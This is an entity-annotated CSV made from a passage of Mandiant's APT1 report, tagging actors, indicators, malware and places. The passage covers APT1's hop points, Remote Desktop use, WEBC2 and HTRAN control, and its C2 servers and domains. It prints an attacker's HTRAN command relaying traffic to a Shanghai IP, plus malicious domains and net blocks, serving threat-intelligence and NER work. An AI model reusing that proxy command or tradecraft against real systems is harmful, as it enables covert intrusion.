Mandiant_APT1_Report,2012-02-23,timestamp
Mandiant_APT1_Report,"



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 39 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": InFrastruCture

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, maintains an extensive infrastructure of computers around the world. We have evidence suggesting that ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
manually controls thousands of systems in support of their attacks, and have directly observed their control over 
hundreds of these systems. Although they control systems in dozens of countries, their attacks originate from four large 
networks in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," — two of which are allocated directly to the Pudong New Area, the home of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,". The 
sheer number of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, IP addresses concentrated in these ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," ranges, coupled with Simplified Chinese keyboard 
layout settings on ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s attack systems, betrays the true location and language of the operators. To help manage the 
vast number of systems they control, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has registered hundreds of domain names, the majority of which also point 
to a ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report, locale. The domain names and IP addresses together comprise ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s command and control framework 
which they manage in concert to camouflage their true origin from their English speaking targets.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," Network Origins

We are frequently asked why it is an ineffective security measure to just block all IP addresses in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," from 
connecting to your network. To put it simply, it is easy for ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," attackers to bounce or “hop” through intermediary 
systems such that they almost never connect to a victim network directly from their systems in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,". Using their 
immense infrastructure, they are able to make it appear to victims that an attack originates from almost any country 
they choose. The systems in this type of network redirection infrastructure have come to be called “hop points” 
or “hops.” Hop points are most frequently compromised systems that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," uses, in some instances for years, as 
camouflage for their attacks without the knowledge of the systems’ owners. These systems belong to third-party victims 
who are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data 
and intellectual property.

FIGure 21: ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," bounces through “hop point” systems before accessing victim systems



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 40 www.mandiant.com

We have observed some of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,’s activities after they cross into (virtual) ,O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," territory. They access hop points using 
a variety of techniques, the most popular being ",O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report, and FTP. ,O
Mandiant_APT1_Report,Over a two-year period,timestamp
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,January 2011 to January 2013,timestamp
Mandiant_APT1_Report,") we confirmed 1,905 instances of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," actors logging into their hop infrastructure from 832 different 
IP addresses with ",O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report,. ,O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report," provides a remote user with an interactive graphical interface to 
a system. The experience is similar to the user actually physically sitting at the system and having direct access to the 
desktop, keyboard, and mouse. Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four 
large net blocks in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report, which we will refer to as ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s home networks.

taBLe 8: net blocks corresponding to IP addresses that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," used to access their hop points

number net block registered owner 

445 ",O
Mandiant_APT1_Report,223.166.0.0 - 223.167.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

217 ",O
Mandiant_APT1_Report,58.246.0.0 - 58.247.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

114 ",O
Mandiant_APT1_Report,112.64.0.0 - 112.65.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

12 ",O
Mandiant_APT1_Report,139.226.0.0 - 139.227.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

1 ",O
Mandiant_APT1_Report,114.80.0.0 - 114.95.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

1 ",O
Mandiant_APT1_Report,101.80.0.0 - 101.95.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network

27 Other (non-",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,") Chinese IPs  

Notably, the registration information for the second and third net blocks above includes this contact information at the 
end:

person: ",O
Mandiant_APT1_Report,yanling ruan,identity
Mandiant_APT1_Report,"
nic-hdl:  YR194-AP
e-mail:  ",O
Mandiant_APT1_Report,sh-ipmaster@Chinaunicom.cn,ioc
Mandiant_APT1_Report,"
address:  No.900,Pudong Avenue,",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,",",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
phone:  +086-021-61201616
fax-no:  +086-021-61201616
country:  ",O
Mandiant_APT1_Report,cn,country
Mandiant_APT1_Report,"

The registration information for these two net blocks suggests that they serve the Pudong New Area of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", where 
",O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report," is headquartered. 

The other 15 of the 832 IP addresses are registered to organizations in the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," (12), ",O
Mandiant_APT1_Report,Taiwan,country
Mandiant_APT1_Report," (1), ",O
Mandiant_APT1_Report,Japan,country
Mandiant_APT1_Report, (1) and ,O
Mandiant_APT1_Report,Korea,country
Mandiant_APT1_Report," 
(1). We have confirmed that some of these systems are part of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s hop infrastructure and not legitimately owned 
by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," — in other words, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," accessed one hop from another hop, as opposed to accessing the hop directly from 
",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,".

In order to make a user’s experience as seamless as possible, the ",O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report," protocol requires client applications 
to forward several important details to the server, including their client hostname and the client keyboard layout. 
In 1,849 of the 1,905 (97%) ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report," sessions we observed in the past two years, the keyboard 
layout setting was “Chinese (Simplified) — ",O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report, Keyboard.” ,O
Mandiant_APT1_Report,Microsoft’s Remote Desktop,software
Mandiant_APT1_Report," client configures this setting 
automatically based on the selected language on the client system, making it nearly certain that the ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," actors 
managing the hop infrastructure are doing so with Simplified Chinese (zh-cn) input settings. “Simplified Chinese” is 
a streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland 
",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,. ,O
Mandiant_APT1_Report,Taiwan,country
Mandiant_APT1_Report, and municipalities such as ,O
Mandiant_APT1_Report,Hong Kong,country
Mandiant_APT1_Report," still use “Traditional Chinese” (zh-tw) character sets.

The overwhelming concentration of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," IP addresses and Simplified Chinese language settings clearly indicate 
that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, intruders are mainland Chinese speakers with ready access to large networks in ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,". The only 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 41 www.mandiant.com

alternative is that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has intentionally been conducting a years-long deception campaign to impersonate Chinese 
speakers from ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," in places where victims are not reasonably expected to have any visibility – and without 
making a single mistake that might indicate their “true” identity. 

Interaction with Backdoors

As we just mentioned, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," attackers typically use hops to connect to and control victim systems. Victim backdoors 
regularly connect out to hop points, waiting for the moment that the attacker is there to give them commands. However, 
exactly how this works is often specific to the tools they are using. 

MANUAL ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," UPDATES

As covered in the previous “Attack Lifecycle” section, ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," backdoor variants download and interpret data stored 
between tags in HTML pages as commands. They usually download HTML pages from a system within ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s hop 
infrastructure. We have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, intruders logging in to ,O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," servers and manually editing the HTML pages 
that backdoors will download. Because the commands are usually encoded and difficult to spell from memory, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
intruders typically do not type these strings, but instead copy and paste them into the HTML files. They likely generate 
the encoded commands on their own systems before pasting them in to an HTML file hosted by the hop point. For 
example, we observed an ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," attacker pasting the string “czo1NA==” into an HTML page. That string is the base64-
encoded version of “s:54”, meaning “sleep for 54 minutes” (or hours, depending on the particular backdoor). In lieu 
of manually editing an HTML file on a hop point, we have also observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders uploading new (already-edited) 
HTML files. 

",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report,"

When ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, attackers are not using ,O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report,", they require a “command and control” (C2) user interface so they can 
issue commands to the backdoor. This interface sometimes runs on their personal attack system, which is typically 
in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,". In these instances, when a victim backdoor makes contact with a hop, the communications need to be 
forwarded from the hop to the intruder’s ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," system so the backdoor can talk to the C2 server software. We have 
observed 767 separate instances in which ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, intruders used the publicly available “,O
Mandiant_APT1_Report,HUC Packet Transmit Tool,tool
Mandiant_APT1_Report,"” 
or ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," on a hop. As always, keep in mind that these uses are confirmed uses, and likely represent only a small 
fraction of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s total activity.

The ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," utility is merely a middle-man, facilitating connections between the victim and the attacker who is using 
the hop point.

0100100001 0100100001

01010100010101010001 C2HTRAN
FIGure 22: the ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report, tool resides on ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," hop points and acts as a middle-man



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 42 www.mandiant.com

Typical use of ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," is fairly simple: the attacker must specify the originating IP address (of his or her workstation in 
",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"), and a port on which to accept connections. For example, the following command, which was issued by an 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," 
IP address ",O
Mandiant_APT1_Report,58.247.242.254,ioc
Mandiant_APT1_Report," on port 443:

htran -tran 443 ",O
Mandiant_APT1_Report,58.247.242.254,ioc
Mandiant_APT1_Report," 443

In the 767 observed uses of ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders supplied 614 distinct routable IP addresses. In other words, they 
used their hops to function as middlemen between victim systems and 614 different addresses. Of these addresses, 
613 of 614 are part of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s home networks:

taBLe 9: net blocks corresponding to IP addresses used to receive ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," communications 

number net block registered owner

340 ",O
Mandiant_APT1_Report,223.166.0.0 - 223.167.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

160 ",O
Mandiant_APT1_Report,58.246.0.0 - 58.247.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

102 ",O
Mandiant_APT1_Report,112.64.0.0 - 112.65.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

11 ",O
Mandiant_APT1_Report,139.226.0.0 - 139.227.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

1 ",O
Mandiant_APT1_Report,143.89.0.0 - 143.89.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Hong Kong University of Science and Technology,org
Mandiant_APT1_Report,"

C2 SERVER SOFTWARE ON HOP INFRASTRUCTURE

Occasionally, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," attackers have installed C2 server components on systems in their hop infrastructure rather than 
forwarding connections back to C2 servers in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,". In these instances they do not need to use a proxy tool like 
",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," to interact with victim systems. However, it does mean that the intruders need to be able to interface with the 
(often graphical) C2 server software running on the hop. We have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders log in to their hop point, 
start the C2 server, wait for incoming connections, and then proceed to give commands to victim systems.

",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," variants may include a server component that provides a simple C2 interface to the intruder. This saves the 
intruder from having to manually edit webpages. That is, this server component receives connections from victim 
backdoors, displays them to the intruder, and then translates the intruder’s commands into HTML tags that the victim 
backdoors read.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 43 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," Servers

In the last two years alone, we have confirmed 937 ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," C2 servers — that is, actively listening or communicating 
programs — running on 849 distinct IP addresses. However, we have evidence to suggest that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," is running 
hundreds, and likely thousands, of other servers (see the Domains section below). The programs acting as ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
servers have mainly been: (1) ",O
Mandiant_APT1_Report,FTP,tool
Mandiant_APT1_Report,", for transferring files; (2) ",O
Mandiant_APT1_Report,web,tool
Mandiant_APT1_Report,", primarily for ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report,; (3) ,O
Mandiant_APT1_Report,RDP,tool
Mandiant_APT1_Report,", for remote graphical 
control of a system; (4) ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report,", for proxying; and (5) C2 servers associated with various backdoor families (covered in 
Appendix C: The Malware Arsenal). 

",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," (709)

US (109)

",O
Mandiant_APT1_Report,South Korea,country
Mandiant_APT1_Report, (11) ,O
Mandiant_APT1_Report,Taiwan,country
Mandiant_APT1_Report," (6)
",O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report," (3)
",O
Mandiant_APT1_Report,Australia,country
Mandiant_APT1_Report," (2)
",O
Mandiant_APT1_Report,Mexico,country
Mandiant_APT1_Report," (2)
",O
Mandiant_APT1_Report,Norway,country
Mandiant_APT1_Report," (2)
",O
Mandiant_APT1_Report,Belgium,country
Mandiant_APT1_Report," (1)
",O
Mandiant_APT1_Report,Denmark,country
Mandiant_APT1_Report," (1)
",O
Mandiant_APT1_Report,Indonesia,country
Mandiant_APT1_Report," (1)
",O
Mandiant_APT1_Report,India,country
Mandiant_APT1_Report," (1)
",O
Mandiant_APT1_Report,Singapore,country
Mandiant_APT1_Report," (1)

Global distribution of confirmed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," servers

",O
Mandiant_APT1_Report,223.166.0.0 - 223.167.255.255,ioc
Mandiant_APT1_Report,": 406
(",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,")

",O
Mandiant_APT1_Report,58.246.0.0 - 58.247.255.255,ioc
Mandiant_APT1_Report,": 180
(",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,") 

",O
Mandiant_APT1_Report,112.64.0.0 - 112.65.255.255,ioc
Mandiant_APT1_Report,": 93
(",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,") 

",O
Mandiant_APT1_Report,139.226.0.0 - 139.227.255.255,ioc
Mandiant_APT1_Report,": 19
(",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,) Other: 11 (including 7 in ,O
Mandiant_APT1_Report,Hong Kong,country
Mandiant_APT1_Report,")

Distribution of confirmed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, servers in ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"

FIGure 23: the global distribution of confirmed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," servers



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 44 www.mandiant.com

Domain Names

The Domain Name System (DNS) is the phone book of the Internet. In the same way that people program named 
contacts into their cell phones and no longer need to remember phone numbers, DNS allows people to remember 
names like “google.com” instead of IP addresses. When a person types “google.com” into a web browser, a DNS 
translation to an IP address occurs so that the person’s computer can communicate with ",O
Mandiant_APT1_Report,Google,org
Mandiant_APT1_Report,". Names that can be 
translated through DNS to IP addresses are referred to as Fully Qualified Domain Names (FQDNs).

0100100001 0100100001

01010100010101010001

",O
Mandiant_APT1_Report,ug-co.hugesoft.org,ioc
Mandiant_APT1_Report,"

      1010010010100101

1001100100011010100                     

1001100100011               

DNS QUERY        

“Here’s the IP address”

C2

FIGure 24: Dns queries are used to resolve ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDns to many C2 server IPs



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 45 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s infrastructure includes FQDNs in addition 
to the IP addresses discussed above. The FQDNs 
play an important role in their intrusion campaigns 
because ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," embeds FQDNs as C2 addresses 
within their backdoors. In the last several years 
we have confirmed 2,551 FQDNs attributed to 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". Of these, we have redacted FQDNs that 
implicated victims by name and provided 2,046 in 
Appendix D. By using FQDNs rather than hard-
coded IP addresses as C2 addresses, attackers 
may dynamically decide where to direct C2 
connections from a given backdoor. That is, if they 
lose control of a specific hop point (IP address) 
they can “point” the C2 FQDN address to a 
different IP address and resume their control over 
victim backdoors. This flexibility allows the attacker 
to direct victim systems to myriad C2 servers and 
avoid being blocked.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDNs can be grouped into three categories: 
(1) registered zones, (2) third-party zones, and (3) 
hijacked domains. 

REGISTERED ZONES

A DNS zone represents a collection of FQDNs that 
end with the same name, and which are usually 
registered through a domain registration company 
and controlled by a single owner. For example, 
“",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"” is an FQDN but also represents 
a zone. The FQDNs “",O
Mandiant_APT1_Report,ug-co.hugesoft.org,ioc
Mandiant_APT1_Report,"” and 
“",O
Mandiant_APT1_Report,7cback.hugesoft.org,ioc
Mandiant_APT1_Report,” are part of the “,O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"” zone and are called “subdomains” of the zone. 
The person who registered “",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"” may add 
as many subdomains as they wish and controls the 
IP resolutions of these FQDNs. ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has registered 
at least 107 zones ",O
Mandiant_APT1_Report,since 2004,timestamp
Mandiant_APT1_Report,". Within these zones, 
we know of thousands of FQDNs that have resolved 
to hundreds of IP addresses (which we suspect are 
hops) and in some instances to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s source IP 
addresses in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,".

The first zone we became aware of was “",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"”, which was registered through ",O
Mandiant_APT1_Report,"eNom, Inc.",org
Mandiant_APT1_Report, in ,O
Mandiant_APT1_Report,October 2004,timestamp
Mandiant_APT1_Report,". The registrant supplied 
“",O
Mandiant_APT1_Report,uglygorilla@163.com,identity
Mandiant_APT1_Report,"” as an email address. The 
supplied registration information, which is still 
visible in public “whois” data as of ",O
Mandiant_APT1_Report,"February 3, 2013",timestamp
Mandiant_APT1_Report,", includes the following:

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," Zone Registrations

",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,ustvb.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,uszzcs.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,hvmetal.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,hkcastte.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,attnpower.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,ifexcel.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,bpyoyo.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,skyswim.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,cslisten.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,bigish.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,chileexe77.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,issnbgkit.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,progammerli.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,idirectech.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,livemymsn.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,webservicesupdate.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,giftnews.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,onefastgame.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,conferencesinfo.com,ioc
Mandiant_APT1_Report,"

5 zones created

",O
Mandiant_APT1_Report,cometoway.org,ioc
Mandiant_APT1_Report,"

6 zones created

6 zones created

",O
Mandiant_APT1_Report,usnftc.org,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,phoenixtvus.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,ushongkong.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newsesport.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,youipcam.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,olmusic100.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,todayusa.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,bluecoate.com,ioc
Mandiant_APT1_Report,"

4 zones created

",O
Mandiant_APT1_Report,bigdepression.net,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,arrowservice.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,blackcake.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,businessconsults.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,infosupports.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newsonet.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,purpledaily.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,avvmail.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,shepmas.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,syscation.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,tibethome.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,microsoft-update-info.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,busketball.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,comrepair.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,gmailboxes.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,oplaymagzine.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,maltempata.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,nirvanaol.com,ioc
Mandiant_APT1_Report,"

7 zones created

",O
Mandiant_APT1_Report,cnndaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,satellitebbs.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,msnhome.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,usabbs.org,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,ns06.net,ioc
Mandiant_APT1_Report,"

6 zones created

",O
Mandiant_APT1_Report,copporationnews.com,ioc
Mandiant_APT1_Report,"

7 zones created
",O
Mandiant_APT1_Report,nytimesnews.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,cnnnewsdaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,applesoftupdate.com,ioc
Mandiant_APT1_Report,"

4 zones created

",O
Mandiant_APT1_Report,micyuisyahooapis.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,infobusinessus.org,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2004,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2005,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2006,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2007,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2008,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2009,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2010,timestamp
